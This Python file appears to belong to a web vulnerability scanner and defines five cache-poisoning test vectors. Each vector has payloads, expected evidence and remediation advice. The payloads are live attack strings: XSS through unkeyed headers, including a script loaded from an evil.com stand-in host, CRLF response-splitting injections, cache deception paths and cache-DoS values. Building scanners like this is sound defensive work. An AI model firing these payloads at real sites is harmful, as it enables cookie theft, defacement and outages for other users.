"""
Web Cache Poisoning Test Vectors
Targets cache poisoning, cache deception, and cache-based vulnerabilities
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

CACHE_POISONING_VECTORS = [
    TestVector(
        id="cache-poison-xss-001",
        name="Cache Poisoning via Unkeyed Header XSS",
        description="Poison web cache with XSS payload through unkeyed headers",
        vuln_type=VulnerabilityType.CACHE_POISONING,
        position=Position(
            type=PositionType.HEADER, name="X-Forwarded-Host", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base='evil.com"><script>alert(document.domain)</script>',
            variants=[
                'attacker.com/"><img src=x onerror=alert(1)>',
                "evil.com'><script src=https://evil.com/xss.js></script>",
                'attacker.com\\"><svg onload=alert(1)>',
                "evil.com%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E",
            ],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "XSS payload in cached response",
                "Cache hit with malicious content",
                "X-Cache: HIT",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["cache-poisoning", "xss", "unkeyed-header", "web-cache"],
        references=[
            "https://portswigger.net/research/practical-web-cache-poisoning",
            "https://portswigger.net/web-security/web-cache-poisoning",
            "https://www.youtube.com/watch?v=j2RrmNxJZ5c",
        ],
        remediation="Include security-relevant headers in cache key, validate all headers, implement strict cache policies",
    ),
    TestVector(
        id="cache-deception-001",
        name="Web Cache Deception Attack",
        description="Trick cache into storing private user data accessible to attackers",
        vuln_type=VulnerabilityType.CACHE_POISONING,
        position=Position(
            type=PositionType.PATH, name="path", value_prefix="/account/", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="profile.css",
            variants=["settings.js", "data.png", "info.jpg", "details.ico", "page.svg"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=["Private data cached", "Cache-Control: public", "Sensitive info in cache"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["cache-deception", "cache-poisoning", "information-disclosure", "privacy"],
        references=[
            "https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html",
            "https://portswigger.net/research/bypassing-web-cache-poisoning-countermeasures",
            "https://www.youtube.com/watch?v=mroq9eHFOIU",
        ],
        remediation="Never cache authenticated pages, validate path extensions, implement Cache-Control: no-store for private data",
    ),
    TestVector(
        id="cache-dos-001",
        name="Cache Poisoning Denial of Service",
        description="Poison cache with error pages to cause widespread service disruption",
        vuln_type=VulnerabilityType.CACHE_POISONING,
        position=Position(
            type=PositionType.HEADER, name="X-Original-URL", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="/error",
            variants=["/404", "/500", "/admin/logout", "/api/shutdown", "///malformed///"],
            encoding="none",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Error page cached",
                "Service unavailable for all users",
                "X-Cache: HIT with error",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["cache-poisoning", "dos", "availability", "cache-dos"],
        references=[
            "https://portswigger.net/research/practical-web-cache-poisoning",
            "https://cpdos.org/",
            "https://www.usenix.org/conference/usenixsecurity20/presentation/mirheidari",
        ],
        remediation="Never cache error pages, validate URL rewrite headers, implement cache validation",
    ),
    TestVector(
        id="cache-split-001",
        name="Cache Poisoning via HTTP Response Splitting",
        description="Inject malicious response into cache using CRLF in unkeyed headers",
        vuln_type=VulnerabilityType.CACHE_POISONING,
        position=Position(
            type=PositionType.HEADER, name="X-Forwarded-Scheme", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="http%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<script>alert(1)</script>",
            variants=[
                "https%0aSet-Cookie:%20admin=true",
                "http%0d%0aLocation:%20https://evil.com",
                "https%0d%0a%0d%0a<html><body>Defaced</body></html>",
                "http%0aContent-Type:%20text/javascript%0a%0aalert(document.cookie)",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Split response cached",
                "Malicious content in cache",
                "CRLF injection successful",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["cache-poisoning", "crlf", "response-splitting", "xss"],
        references=[
            "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn",
            "https://www.owasp.org/index.php/HTTP_Response_Splitting",
            "https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html",
        ],
        remediation="Sanitize all headers, strip CRLF characters, validate cache responses, use HTTP/2",
    ),
    TestVector(
        id="cache-key-001",
        name="Cache Key Manipulation Attack",
        description="Manipulate cache key to serve malicious content or bypass security",
        vuln_type=VulnerabilityType.CACHE_POISONING,
        position=Position(
            type=PositionType.HEADER, name="X-Forwarded-Proto", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="https", variants=["http", "ftp", "file", "ws", "wss"], encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=[
                "Different cache key",
                "Cache bypass",
                "Protocol confusion",
                "Mixed content",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        tags=["cache-poisoning", "cache-key", "bypass", "protocol-confusion"],
        references=[
            "https://portswigger.net/research/practical-web-cache-poisoning",
            "https://www.gremwell.com/cache_poisoning_in_the_wild",
            "https://infosecwriteups.com/practical-cache-poisoning-in-the-wild-d8b79c75f8c7",
        ],
        remediation="Include protocol in cache key, validate X-Forwarded-Proto, implement HSTS, use canonical URLs",
    ),
]
